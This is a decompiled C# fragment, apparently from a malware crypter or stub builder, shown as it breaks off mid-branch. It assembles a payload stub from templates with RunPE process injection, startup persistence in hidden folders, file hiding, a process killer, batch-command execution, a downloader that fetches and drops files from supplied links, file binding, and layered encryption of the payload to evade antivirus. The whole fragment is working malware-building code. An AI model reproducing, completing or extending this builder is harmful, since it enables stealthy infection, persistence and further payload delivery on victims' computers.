            ResourceWriter resourceWriter2 = new ResourceWriter(Application.StartupPath + "\\" + text + "abc.resources");
            try
            {
                byte[] inArray = null;
                string text2 = Properties.Resources.MAINSOURCE;
                if (this.rdbCustomPic.Checked)
                {
                    if (this.pic1.Image == null)
                    {
                        this.method_5("Every picturebox must contains an image!");
                        resourceWriter.Close();
                        resourceWriter2.Close();
                        return;
                    }
                    if (this.pic2.Image == null)
                    {
                        this.method_5("Every picturebox must contains an image!");
                        resourceWriter.Close();
                        resourceWriter2.Close();
                        return;
                    }
                    if (this.pic3.Image == null)
                    {
                        this.method_5("Every picturebox must contains an image!");
                        resourceWriter.Close();
                        resourceWriter2.Close();
                        return;
                    }
                    if (this.pic4.Image == null)
                    {
                        this.method_5("Every picturebox must contains an image!");
                        resourceWriter.Close();
                        resourceWriter2.Close();
                        return;
                    }
                    string b = smethod_0(Properties.Resources.main);
                    string b2 = smethod_0(Properties.Resources.runpe);
                    string b3 = smethod_0(Properties.Resources.other);
                    string b4 = smethod_0(Properties.Resources.Enc);
                    string a = smethod_0(this.pic1.Image);
                    string a2 = smethod_0(this.pic2.Image);
                    string a3 = smethod_0(this.pic3.Image);
                    string a4 = smethod_0(this.pic4.Image);
                    if (a == b)
                    {
                        text2 = text2.Replace("[1]", Properties.Resources.Mainpic);
                    }
                    else
                    {
                        if (a == b2)
                        {
                            text2 = text2.Replace("[1]", Properties.Resources.Runpepic);
                        }
                        else
                        {
                            if (a == b4)
                            {
                                text2 = text2.Replace("[1]", Properties.Resources.EncPic);
                            }
                            else
                            {
                                if (a == b3)
                                {
                                    text2 = text2.Replace("[1]", Properties.Resources.OtherPic);
                                }
                            }
                        }
                    }
                    if (a2 == b)
                    {
                        text2 = text2.Replace("[2]", Properties.Resources.Mainpic);
                    }
                    else
                    {
                        if (a2 == b2)
                        {
                            text2 = text2.Replace("[2]", Properties.Resources.Runpepic);
                        }
                        else
                        {
                            if (a2 == b4)
                            {
                                text2 = text2.Replace("[2]", Properties.Resources.EncPic);
                            }
                            else
                            {
                                if (a2 == b3)
                                {
                                    text2 = text2.Replace("[2]", Properties.Resources.OtherPic);
                                }
                            }
                        }
                    }
                    if (a3 == b)
                    {
                        text2 = text2.Replace("[3]", Properties.Resources.Mainpic);
                    }
                    else
                    {
                        if (a3 == b2)
                        {
                            text2 = text2.Replace("[3]", Properties.Resources.Runpepic);
                        }
                        else
                        {
                            if (a3 == b4)
                            {
                                text2 = text2.Replace("[3]", Properties.Resources.EncPic);
                            }
                            else
                            {
                                if (a3 == b3)
                                {
                                    text2 = text2.Replace("[3]", Properties.Resources.OtherPic);
                                }
                            }
                        }
                    }
                    if (a4 == b)
                    {
                        text2 = text2.Replace("[4]", Properties.Resources.Mainpic);
                    }
                    else
                    {
                        if (a4 == b2)
                        {
                            text2 = text2.Replace("[4]", Properties.Resources.Runpepic);
                        }
                        else
                        {
                            if (a4 == b4)
                            {
                                text2 = text2.Replace("[4]", Properties.Resources.EncPic);
                            }
                            else
                            {
                                if (a4 == b3)
                                {
                                    text2 = text2.Replace("[4]", Properties.Resources.OtherPic);
                                }
                            }
                        }
                    }
                }
                else
                {
                    text2 = text2.Replace("[1]", Properties.Resources.Mainpic);
                    text2 = text2.Replace("[2]", Properties.Resources.Runpepic);
                    text2 = text2.Replace("[3]", Properties.Resources.EncPic);
                    text2 = text2.Replace("[4]", Properties.Resources.OtherPic);
                }
                text2 = text2.Replace("[MUTEXTKEY]", this.txtMutex.Text);
                if (this.chckBatch.Checked)
                {
                    string text3 = "System.IO.StreamWriter ba = new System.IO.StreamWriter(Application.LocalUserAppDataPath + \"\\run.bat\");\r\n";
                    string[] lines = this.txtBatch2.Lines;
                    for (int i = 0; i < lines.Length; i++)
                    {
                        string newValue = lines[i];
                        string str2 = Properties.Resources.Batch.Replace("[COMMANDBATCH]", newValue);
                        text3 += str2;
                    }
                    text2 = text2.Replace("[BATCH1]", text3);
                    text2 = text2.Replace("[BATCH2]", Properties.Resources.Batch2);
                }
                else
                {
                    text2 = text2.Replace("[BATCH1]", string.Empty);
                    text2 = text2.Replace("[BATCH2]", string.Empty);
                }
                if (this.chckNETfile.Checked)
                {
                    text2 = text2.Replace("[DROPLOADER]", string.Empty);
                    text2 = text2.Replace("[DOTNETORNOT]", Properties.Resources.ISDOTNET);
                    text2 = text2.Replace("[RUNPE]", string.Empty);
                    text2 = text2.Replace("[RUNPE-CALL]", Properties.Resources.AssloadNew);
                    text2 = text2.Replace("[ANOTHERINJECT]", string.Empty);
                    text2 = text2.Replace("[NETCALL]", "");
                    text2 = text2.Replace("[YES]", Properties.Resources.YES);
                }
                else
                {
                    text2 = text2.Replace("[YES]", Properties.Resources.YES);
                    if (this.rdbMeth1.Checked)
                    {
                        text2 = text2.Replace("[DOTNETORNOT]", Properties.Resources.NOTNET);
                        text2 = text2.Replace("[NETCALL]", string.Empty);
                        if (this.rdbRunPE1.Checked)
                        {
                            inArray = Properties.Resources.RunPe2;
                            string text4 = Properties.Resources.AssLoadinv4;
                            text4 = text4.Replace("[TYPE-NUMBER]", "JJ1");
                            text4 = text4.Replace("[METHOD-NAME]", "JJ8");
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", text4);
                        }
                        if (this.rdbRunPE2.Checked)
                        {
                            inArray = Properties.Resources.nrunpe2;
                            string string_ = Properties.Resources.AssloadNew;
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", string_);
                        }
                        if (this.rdbRunPE3.Checked)
                        {
                            inArray = Properties.Resources.RunPe7;
                            string text5 = Properties.Resources.AssLoadinv4;
                            text5 = text5.Replace("[TYPE-NUMBER]", "RunPE");
                            text5 = text5.Replace("[METHOD-NAME]", "InjectPE");
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", text5);
                        }
                        if (this.rdbRunPE4.Checked)
                        {
                            inArray = Properties.Resources.RunPE0;
                            string text6 = Properties.Resources.AssLoadinv4;
                            text6 = text6.Replace("[TYPE-NUMBER]", "rp");
                            text6 = text6.Replace("[METHOD-NAME]", "MakeIt");
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", text6);
                        }
                        if (this.rdbRunPE5.Checked)
                        {
                            inArray = Properties.Resources.RunPe3;
                            string text7 = Properties.Resources.AssLoadinv4;
                            text7 = text7.Replace("[TYPE-NUMBER]", "CMemoryExecute");
                            text7 = text7.Replace("[METHOD-NAME]", "Run");
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", text7);
                        }
                        if (this.rdbRunPE6.Checked)
                        {
                            inArray = Properties.Resources.nrunpe2;
                            string string_2 = Properties.Resources.AssloadNew;
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", string_2);
                        }
                        if (this.rdbRunPE7.Checked)
                        {
                            inArray = Properties.Resources.RunPe7;
                            string text8 = Properties.Resources.AssLoadinv4;
                            text8 = text8.Replace("[TYPE-NUMBER]", "RunPE");
                            text8 = text8.Replace("[METHOD-NAME]", "InjectPE");
                            text2 = text2.Replace("[RUNPE]", string.Empty);
                            text2 = text2.Replace("[RUNPE-CALL]", text8);
                        }
                    }
                }
                if (this.chckAssembly.Checked)
                {
                    text2 = text2.Replace("[ASSMBLY]", Properties.Resources.Assemblyinf);
                    text2 = text2.Replace("[ASSDESCRIPTION]", this.textAssemblyDescription.Text);
                    text2 = text2.Replace("[TITLE]", this.txtAssemblyTitle.Text);
                    text2 = text2.Replace("[COMPANY]", this.textAssemblyCompany.Text);
                    text2 = text2.Replace("[PRODUCT]", this.textAssemblyProduct.Text);
                    text2 = text2.Replace("[COPYRIGHT]", this.textAssemblyCopyRight.Text);
                    string arg_917_0 = text2;
                    string arg_917_1 = "[MAJOR].[MINOR].[BILD].[REVISION]";
                    string[] array = new string[7];
                    string[] arg_8AC_0 = array;
                    int arg_8AC_1 = 0;
                    decimal value = this.intMajor.Value;
                    arg_8AC_0[arg_8AC_1] = value.ToString();
                    array[1] = ".";
                    string[] arg_8CD_0 = array;
                    int arg_8CD_1 = 2;
                    value = this.intMinor.Value;
                    arg_8CD_0[arg_8CD_1] = value.ToString();
                    array[3] = ".";
                    string[] arg_8EE_0 = array;
                    int arg_8EE_1 = 4;
                    value = this.intBuild.Value;
                    arg_8EE_0[arg_8EE_1] = value.ToString();
                    array[5] = ".";
                    string[] arg_90F_0 = array;
                    int arg_90F_1 = 6;
                    value = this.intRevision.Value;
                    arg_90F_0[arg_90F_1] = value.ToString();
                    text2 = arg_917_0.Replace(arg_917_1, string.Concat(array));
                }
                else
                {
                    text2 = text2.Replace("[ASSMBLY]", string.Empty);
                }
                if (this.chckDelay.Checked)
                {
                    text2 = text2.Replace("[DELAY]", Properties.Resources.Delay);
                    if (this.rdbSeconds.Checked)
                    {
                        text2 = text2.Replace("[SLEEPVALUE]", Convert.ToString(this.numUpDownDelay.Value * 1000m));
                    }
                    if (this.rdbMinutes.Checked)
                    {
                        text2 = text2.Replace("[SLEEPVALUE]", Convert.ToString(this.numUpDownDelay.Value * 60000m));
                    }
                }
                else
                {
                    text2 = text2.Replace("[DELAY]", string.Empty);
                }
                if (this.chckHideFile.Checked)
                {
                    text2 = text2.Replace("[HIDEFILE]", Properties.Resources.HIDEFILE);
                }
                else
                {
                    text2 = text2.Replace("[HIDEFILE]", string.Empty);
                }
                if (this.lstProc.Items.Count > 0)
                {
                    string text9 = "List<string> L = new List<string>(new string[]{";
                    int num = 0;
                    foreach (string str3 in this.lstProc.Items)
                    {
                        if (num != this.lstProc.Items.Count - 1)
                        {
                            text9 = text9 + "\"" + str3 + "\",";
                        }
                        else
                        {
                            text9 = text9 + "\"" + str3 + "\"";
                        }
                        num++;
                    }
                    text9 += "});";
                    text9 += Properties.Resources.Prockill;
                    text2 = text2.Replace("[PROCKILL]", text9);
                }
                else
                {
                    text2 = text2.Replace("[PROCKILL]", string.Empty);
                }
                if (this.chckSUp2.Checked)
                {
                    string string_3 = Properties.Resources.Startup;
                    text2 = text2.Replace("[STARTUP]", "fAdsfinDD1CC4A1(\"" + this.textBoxStartup2.Text + "\", true);");
                    text2 = text2.Replace("[STARTUPCALL]", string_3);
                    if (this.chckActiveX.Checked)
                    {
                        text2 = text2.Replace("[ACTIVEXSTART]", "CC1BB1DD1KK1(\"" + this.txtActiveXKey + "\");");
                    }
                    if (!this.chckActiveX.Checked)
                    {
                        text2 = text2.Replace("[ACTIVEXSTART]", string.Empty);
                        text2 = text2.Replace("[ACTIVEXVOID]", string.Empty);
                    }
                    text2 = text2.Replace("[FILENAMESUP]", this.txtFileNameSU.Text);
                    if (this.rdbAppData.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "ApplicationData");
                    }
                    if (this.rdbCookies.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "Cookies");
                    }
                    if (this.rdbDesktop.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "Desktop");
                    }
                    if (this.rdbFavourites.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "Favorites");
                    }
                    if (this.rdbHistory.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "History");
                    }
                    if (this.rdbMyMusic.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "MyMusic");
                    }
                    if (this.rdbMyPrictures.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "MyPictures");
                    }
                    if (this.rdbMyDocuments.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "MyDocuments");
                    }
                    if (this.rdbProgramFiles.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "ProgramFiles");
                    }
                    if (this.rdbRecent.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "Recent");
                    }
                    if (this.rdbResources.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "Resources");
                    }
                    if (this.rdbSystem.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "System");
                    }
                    if (this.rdbWindows.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "Windows");
                    }
                    if (this.rdbStartMenu.Checked)
                    {
                        text2 = text2.Replace("[STARTUPFOLDERSHIZ]", "StartMenu");
                    }
                    if (this.rdbSendTo.Checked)
                    {
                        text2 = text2.Replace("Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \"\\[FILENAMESUP]\"", "Path.GetTempPath()");
                    }
                    bool arg_DB6_0 = this.rdbStart2.Checked;
                    if (this.chckSubFolder.Checked)
                    {
                        text2 = text2.Replace("[SUBFOLDER]", this.txtSubFolder.Text);
                    }
                    if (!this.chckSubFolder.Checked)
                    {
                        text2 = text2.Replace("[SUBFOLDER]\\\\", "");
                    }
                }
                else
                {
                    text2 = text2.Replace("[STARTUP]", string.Empty);
                    text2 = text2.Replace("[STARTUPCALL]", string.Empty);
                    text2 = text2.Replace("[ACTIVEXSTART]", string.Empty);
                    text2 = text2.Replace("[ACTIVEXVOID]", string.Empty);
                }
                if (this.lstDownloadLinks.Items.Count > 0)
                {
                    string text10 = "System.Net.WebClient JJ7 = new System.Net.WebClient();\r\n";
                    if (this.chckProxy.Checked)
                    {
                        text10 += "JJ7.Proxy = null;\r\n";
                    }
                    foreach (string text11 in this.lstDownloadLinks.Items)
                    {
                        string newValue2 = text11.Split(new char[]
               {
                   '/'
               })[text11.Split(new char[]
               {
                   '/'
               }).Length - 1];
                        string text12 = Properties.Resources.SingleDL.Replace("{ADDRESS}", text11);
                        text12 = text12.Replace("{FILENAME}", newValue2);
                        text10 += text12;
                    }
                    if (this.rdbEnd.Checked)
                    {
                        text2 = text2.Replace("[DOWNLOAD-DROP]", text10);
                        text2 = text2.Replace("[DOWNLOAD-DROP1]", string.Empty);
                        if (this.rdbDLapp.Checked)
                        {
                            text2 = text2.Replace("[SINGLEDLDROPPLACE]", "ApplicationData");
                        }
                        if (this.rdbDLTemp.Checked)
                        {
                            text2 = text2.Replace("Environment.GetFolderPath(Environment.SpecialFolder.[SINGLEDLDROPPLACE])", "Environment.GetEnvironmentVariable(\"TEMP\")");
                        }
                        if (this.rdbDLsystem.Checked)
                        {
                            text2 = text2.Replace("[SINGLEDLDROPPLACE]", "System");
                        }
                    }
                    if (this.rdbStart.Checked)
                    {
                        text2 = text2.Replace("[DOWNLOAD-DROP1]", text10);
                        text2 = text2.Replace("[DOWNLOAD-DROP]", string.Empty);
                        if (this.rdbDLapp.Checked)
                        {
                            text2 = text2.Replace("[SINGLEDLDROPPLACE]", "ApplicationData");
                        }
                        if (this.rdbDLTemp.Checked)
                        {
                            text2 = text2.Replace("Environment.GetFolderPath(Environment.SpecialFolder.[SINGLEDLDROPPLACE])", "Environment.GetEnvironmentVariable(\"TEMP\")");
                        }
                        if (this.rdbDLsystem.Checked)
                        {
                            text2 = text2.Replace("[SINGLEDLDROPPLACE]", "System");
                        }
                    }
                }
                else
                {
                    text2 = text2.Replace("[DOWNLOAD-DROP]", string.Empty);
                    text2 = text2.Replace("[DOWNLOAD-DROP1]", string.Empty);
                }
                string text13 = string.Empty;
                if (this.lstBind.Items.Count > 0)
                {
                    foreach (object current in this.lstBind.Items)
                    {
                        string text14 = this.method_8(this.random_0.Next(15, 20));
                        string text15 = text13;
                        text13 = string.Concat(new string[]
               {
                   text15, 
                   "JJ9KK4BBB2JJ1(\"", 
                   smethod_3(current.ToString()), 
                   "\",\"", 
                   text14, 
                   "\");\r\n"
               });
                        resourceWriter.AddResource(text14, File.ReadAllBytes(current.ToString()));
                        Thread.Sleep(10);
                    }
                    text2 = text2.Replace("[BINDVOID]", Properties.Resources.BindSource);
                    if (this.rdbBindStart.Checked)
                    {
                        text2 = text2.Replace("[BIND-DROP1]", text13);
                        text2 = text2.Replace("[BIND-DROP2]", string.Empty);
                    }
                    else
                    {
                        text2 = text2.Replace("[BIND-DROP2]", text13);
                        text2 = text2.Replace("[BIND-DROP1]", string.Empty);
                    }
                }
                else
                {
                    text2 = text2.Replace("[BINDVOID]", string.Empty);
                    text2 = text2.Replace("[BIND-DROP1]", string.Empty);
                    text2 = text2.Replace("[BIND-DROP2]", string.Empty);
                }
                if (this.txtCryptFile.Text != string.Empty)
                {
                    byte[] array2 = File.ReadAllBytes(this.txtCryptFile.Text);
                    if (this.rdbRC2.Checked)
                    {
                        this.txtKey.Text = this.txtKey.Text.Remove(7);
                        string text16 = this.txtKey.Text;
                        array2 = GClass0.smethod_12(array2, text16 + "a", text16);
                        text2 = text2.Replace("[DECRYPTION]", Properties.Resources.RC2);
                        text2 = text2.Replace("[DECRYPT-STRING]", string.Concat(new string[]
               {
                   "RC2Decrypt(KKKKK1, \"", 
                   text16, 
                   "\", \"", 
                   text16, 
                   "\")"
               }));
                    }
                    else
                    {
                        if (this.rdbRSM.Checked)
                        {
                            array2 = this.method_42(array2, Encoding.UTF8.GetBytes(this.txtKey.Text));
                            text2 = text2.Replace("[DECRYPTION]", Properties.Resources.RSM);
                            text2 = text2.Replace("[DECRYPT-STRING]", "RSMDecrypt(KKKKK1, Encoding.UTF8.GetBytes(\"" + this.txtKey.Text + "\")");
                        }
                        else
                        {
                            if (this.rdbRC4.Checked)
                            {
                                this.txtKey.Text = this.txtKey.Text.Remove(15);
                                string text17 = this.txtKey.Text;
                                array2 = GClass0.smethod_5(array2, text17);
                                text2 = text2.Replace("[DECRYPTION]", Properties.Resources.RC4);
                                text2 = text2.Replace("[DECRYPT-STRING]", "RC4(KKKKK1, \"" + text17 + "\")");
                            }
                            else
                            {
                                if (this.rdbPolyRev.Checked)
                                {
                                    this.txtKey.Text = this.txtKey.Text.Remove(9);
                                    string text18 = this.txtKey.Text;
                                    array2 = GClass0.smethod_11(array2, text18);
                                    text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyRev);
                                    text2 = text2.Replace("[DECRYPT-STRING]", "PolyRevDecrypt(KKKKK1, \"" + text18 + "\")");
                                }
                                else
                                {
                                    if (this.rdbRijndael.Checked)
                                    {
                                        this.txtKey.Text = this.txtKey.Text.Remove(33);
                                        string text19 = this.txtKey.Text;
                                        array2 = GClass0.smethod_3(array2, text19);
                                        text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Rijindael);
                                        text2 = text2.Replace("[DECRYPT-STRING]", "RijndaelDecrypt(KKKKK1, \"" + text19 + "\")");
                                    }
                                    else
                                    {
                                        if (this.rdbXOR.Checked)
                                        {
                                            this.txtKey.Text = this.txtKey.Text.Remove(33);
                                            string text20 = this.txtKey.Text;
                                            string text21 = Convert.ToString(this.random_0.Next(50, 500));
                                            array2 = GClass0.smethod_6(array2, text20, Convert.ToInt32(text21));
                                            text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Xor);
                                            text2 = text2.Replace("[DECRYPT-STRING]", string.Concat(new string[]
                                   {
                                       "XOR(KKKKK1, \"", 
                                       text20, 
                                       "\", ", 
                                       text21, 
                                       ")"
                                   }));
                                        }
                                        else
                                        {
                                            if (this.rdbTripleDES.Checked)
                                            {
                                                this.txtKey.Text = this.txtKey.Text.Remove(9);
                                                string text22 = this.txtKey.Text;
                                                array2 = GClass0.smethod_10(array2, text22);
                                                text2 = text2.Replace("[DECRYPTION]", Properties.Resources.TripleDES);
                                                text2 = text2.Replace("[DECRYPT-STRING]", "TripleDESDecrypt(KKKKK1, \"" + text22 + "\")");
                                            }
                                            else
                                            {
                                                if (this.rdbPolyDex.Checked)
                                                {
                                                    this.txtKey.Text = this.txtKey.Text.Remove(33);
                                                    string text23 = this.txtKey.Text;
                                                    array2 = GClass0.smethod_2(array2, text23);
                                                    text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyDex);
                                                    text2 = text2.Replace("[DECRYPT-STRING]", "PolyDexDecrypt(KKKKK1, \"" + text23 + "\")");
                                                }
                                                else
                                                {
                                                    if (this.rdbPolyStairs.Checked)
                                                    {
                                                        this.txtKey.Text = this.txtKey.Text.Remove(34);
                                                        string text24 = this.txtKey.Text;
                                                        array2 = GClass0.smethod_8(array2, text24);
                                                        text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyStairs);
                                                        text2 = text2.Replace("[DECRYPT-STRING]", "PolyStairDeCrypt(KKKKK1, \"" + text24 + "\")");
                                                    }
                                                    else
                                                    {
                                                        if (this.rdbSymetric.Checked)
                                                        {
                                                            this.txtKey.Text = this.txtKey.Text.Remove(16);
                                                            string text25 = this.txtKey.Text;
                                                            array2 = GClass0.smethod_9(array2, text25);
                                                            text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Symetric);
                                                            text2 = text2.Replace("[DECRYPT-STRING]", "SymetricDecrypt(KKKKK1, \"" + text25 + "\")");
                                                        }
                                                        else
                                                        {
                                                            if (this.rdbAES.Checked)
                                                            {
                                                                this.txtKey.Text = this.txtKey.Text.Remove(17);
                                                                string text26 = this.txtKey.Text;
                                                                array2 = GClass0.smethod_18(array2, text26);
                                                                text2 = text2.Replace("[DECRYPTION]", Properties.Resources.AES);
                                                                text2 = text2.Replace("[DECRYPT-STRING]", "AESDecrypt(KKKKK1, \"" + text26 + "\")");
                                                            }
                                                            else
                                                            {
                                                                if (this.rdbPolyBaby.Checked)
                                                                {
                                                                    this.txtKey.Text = this.txtKey.Text.Remove(17);
                                                                    string text27 = this.txtKey.Text;
                                                                    array2 = GClass0.smethod_14(array2, text27);
                                                                    text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyBaby);
                                                                    text2 = text2.Replace("[DECRYPT-STRING]", "PolyBabyDecrypt(KKKKK1, \"" + text27 + "\")");
                                                                }
                                                                else
                                                                {
                                                                    if (this.rdbDex.Checked)
                                                                    {
                                                                        this.txtKey.Text = this.txtKey.Text.Remove(17);
                                                                        string text28 = this.txtKey.Text;
                                                                        array2 = GClass0.smethod_13(array2, text28);
                                                                        text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Dex);
                                                                        text2 = text2.Replace("[DECRYPT-STRING]", "DexDecrypt(KKKKK1, \"" + text28 + "\")");
                                                                    }
                                                                    else
                                                                    {
                                                                        if (this.rdbBind1.Checked)
                                                                        {
                                                                            this.txtKey.Text = this.txtKey.Text.Remove(17);
                                                                            string text29 = this.txtKey.Text;
                                                                            array2 = GClass0.smethod_15(array2, text29);
                                                                            text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Cloud);
                                                                            text2 = text2.Replace("[DECRYPT-STRING]", "CloudDecrypt(KKKKK1, \"" + text29 + "\")");
                                                                        }
                                                                        else
                                                                        {
                                                                            if (this.rdbPolyAES.Checked)
                                                                            {
                                                                                this.txtKey.Text = this.txtKey.Text.Remove(33);
                                                                                string text30 = this.txtKey.Text;
                                                                                array2 = GClass0.smethod_4(array2, text30);
                                                                                text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyAes);
                                                                                text2 = text2.Replace("[DECRYPT-STRING]", "PolyAESDecrypt(KKKKK1, \"" + text30 + "\")");
                                                                            }
                                                                            else
                                                                            {
                                                                                if (this.rdbStairs.Checked)
                                                                                {
                                                                                    this.txtKey.Text = this.txtKey.Text.Remove(19);
                                                                                    string text31 = this.txtKey.Text;
                                                                                    array2 = GClass0.smethod_16(array2, text31);
                                                                                    text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Stairs);
                                                                                    text2 = text2.Replace("[DECRYPT-STRING]", "StairsDecrypt(KKKKK1, \"" + text31 + "\")");
                                                                                }
                                                                                else
                                                                                {
                                                                                    if (this.rdbPoly3DES.Checked)
                                                                                    {
                                                                                        this.txtKey.Text = this.txtKey.Text.Remove(23);
                                                                                        string text32 = this.txtKey.Text;
                                                                                        array2 = GClass0.smethod_19(array2, text32);
                                                                                        text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Poly3DES);
                                                                                        text2 = text2.Replace("[DECRYPT-STRING]", "PolyTripleDESDecrypt(KKKKK1, \"" + text32 + "\")");
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                        if (this.rdbPolyDES.Checked)
                                                                                        {
                                                                                            this.txtKey.Text = this.txtKey.Text.Remove(8);
                                                                                            string text33 = this.txtKey.Text;
                                                                                            array2 = GClass0.smethod_21(array2, text33);
                                                                                            text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyDES);
                                                                                            text2 = text2.Replace("[DECRYPT-STRING]", "PolyDESDecrypt(KKKKK1, \"" + text33 + "\")");
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            if (this.rdbPolyRijn.Checked)
                                                                                            {
                                                                                                this.txtKey.Text = this.txtKey.Text.Remove(25);
                                                                                                string text34 = this.txtKey.Text;
                                                                                                array2 = GClass0.smethod_23(array2, text34);
                                                                                                text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyRijn);
                                                                                                text2 = text2.Replace("[DECRYPT-STRING]", "PolyRijndaelDecrypt(KKKKK1, \"" + text34 + "\")");
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                if (this.rdbPolySym.Checked)
                                                                                                {
                                                                                                    this.txtKey.Text = this.txtKey.Text.Remove(16);
                                                                                                    string text35 = this.txtKey.Text;
                                                                                                    array2 = GClass0.smethod_1(array2, text35);
                                                                                                    text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolySym);
                                                                                                    text2 = text2.Replace("[DECRYPT-STRING]", "PolySymetricDecrypt(KKKKK1, \"" + text35 + "\")");
                                                                                                }
                                                                                                else
                                                                                                {
                                                                                                    if (this.rdbPolyRC2.Checked)
                                                                                                    {
                                                                                                        this.txtKey.Text = this.txtKey.Text.Remove(8);
                                                                                                        string text36 = this.txtKey.Text;
                                                                                                        array2 = GClass0.smethod_0(array2, text36);
                                                                                                        text2 = text2.Replace("[DECRYPTION]", Properties.Resources.PolyRC2);
                                                                                                        text2 = text2.Replace("[DECRYPT-STRING]", "PolyRC2Decrypt(KKKKK1, \"" + text36 + "\")");
                                                                                                    }
                                                                                                    else
                                                                                                    {
                                                                                                        if (this.rdbPolyCloud.Checked)
                                                                                                        {
                                                                                                            this.txtKey.Text = this.txtKey.Text.Remove(8);
                                                                                                            string text37 = this.txtKey.Text;
                                                                                                            array2 = GClass0.smethod_7(array2, text37);
                                                                                                            text2 = text2.Replace("[DECRYPTION]", Properties.Resources.Polycloud);
                                                                                                            text2 = text2.Replace("[DECRYPT-STRING]", "PolyCloudDecrypt(KKKKK1, \"" + text37 + "\")");
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    if (this.rdbRC22.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(9);
                        string text38 = this.txtKey2.Text;
                        array2 = GClass0.smethod_12(array2, text38 + "a", text38);
                        if (this.rdbRC2.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.RC2);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", string.Concat(new string[]
               {
                   "RC2Decrypt(KKKKK1, \"", 
                   text38, 
                   "\", \"", 
                   text38, 
                   "\");"
               }));
                    }
                    if (this.rdbRC42.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(17);
                        string text39 = this.txtKey2.Text;
                        array2 = GClass0.smethod_5(array2, text39);
                        if (this.rdbRC4.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.RC4);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "RC4(KKKKK1, \"" + text39 + "\");");
                    }
                    if (this.rdbRSM2.Checked)
                    {
                        array2 = this.method_42(array2, Encoding.UTF8.GetBytes(this.txtKey2.Text));
                        if (this.rdbRSM.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.RSM);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "RSMDecrypt(KKKKK1, Encoding.UTF8.GetBytes(\"" + this.txtKey2.Text + "\");");
                    }
                    if (this.rdbPolyRev2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(9);
                        string text40 = this.txtKey2.Text;
                        array2 = GClass0.smethod_11(array2, text40);
                        if (this.rdbPolyRev.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.PolyRev);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "PolyRevDecrypt(KKKKK1, \"" + text40 + "\");");
                    }
                    if (this.rdbRijndael2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(33);
                        string text41 = this.txtKey2.Text;
                        array2 = GClass0.smethod_3(array2, text41);
                        if (this.rdbRijndael.Checked)
                        {
                            text2 = text2.Replace("[DECRYPTION2]", "");
                        }
                        else
                        {
                            text2 = text2.Replace("[DECRYPTION2]", Properties.Resources.Rijindael);
                        }
                        text2 = text2.Replace("[DECRYPT-STRING2]", "RijndaelDecrypt(KKKKK1, \"" + text41 + "\");");
                    }
                    if (this.rdbXOR2.Checked)
                    {
                        this.txtKey2.Text = this.txtKey2.Text.Remove(33);
                        string text42 = this.txtKey2.Text;
